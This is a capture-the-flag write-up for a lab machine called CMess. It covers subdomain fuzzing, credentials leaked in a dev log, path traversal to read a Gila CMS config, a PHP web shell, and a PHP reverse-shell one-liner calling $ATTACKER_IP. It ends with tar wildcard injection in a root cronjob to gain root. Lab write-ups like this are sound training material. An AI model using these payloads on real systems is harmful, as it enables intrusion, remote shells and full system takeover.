
# Cmess

## ***User** Flag*

We'll start with nmap scan:

```bash
$ sudo nmap cmess.thm -Pn -p- -vv -A -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Find subdomains:

```bash
$ ./ffuf -u http://cmess.thm/ -t 55 -ic -w ~/CyberSecurity/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.cmess.thm' -fw 522
```

There's a match! Add "dev.cmess.thm" to your ***hosts*** file and visit
http://dev.cmess.thm/ in your browser. There's a development log file:

```
Development Log

> andre@cmess.thm

Have you guys fixed the bug that was found on live?
> support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
> support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
> andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
> support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%
```

So we have a pair of credentials:

> andre@cmess.thm:KPFTN_f2yxe%

Navigate to http://cmess.thm/admin and use those credentials to login.

Checkout the version: Gila CMS version 1.10.9

Find some known vulnerabilities for it.

Use path traversal to find DB credentials. Visit http://cmess.thm/admin/fm?f=./config.php

```
array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
```

Time for RCE. Create a file called ***cmd.php*** With the following contents:

```php
<?php
	$param = $_GET['todo'];
	echo shell_exec($param);
?>
```

As a proof of concept, visit http://cmess.thm/tmp/cmd.php?todo=id

To gain initial foothold, send this as "todo" payload:

```bash
php -r '$sock=fsockopen("$ATTACKER_IP",$ATTACKER_PORT);popen("/bin/bash -i <&3 >&3 2>&3", "r");'
```

Upload linpeas script to the machine via your C2 and execute it. Pay close attention
to cronjobs (Escalation from andre to root) and backup files (escalation from www-data
to andre)

Andre's password is in /opt/.password.bak:

> andre:UQfsdCB7aAP6

---

## ***Root** Flag*

Look at the cronjob.

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

It runs as root and uses wildcard with "tar" command.
Let's exploit the [Wildcard injection](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)

Put your PE script (C2 beacon or just the one that sets SUID to /bin/bash)
in  ***/home/andre/backup/*** folder. Next, create these files there:

```
$ touch -- --checkpoint=1

$ touch "--checkpoint-action=exec=bash my-lpe.sh"
```

Wait for cronjob to execute and enjoy your root!

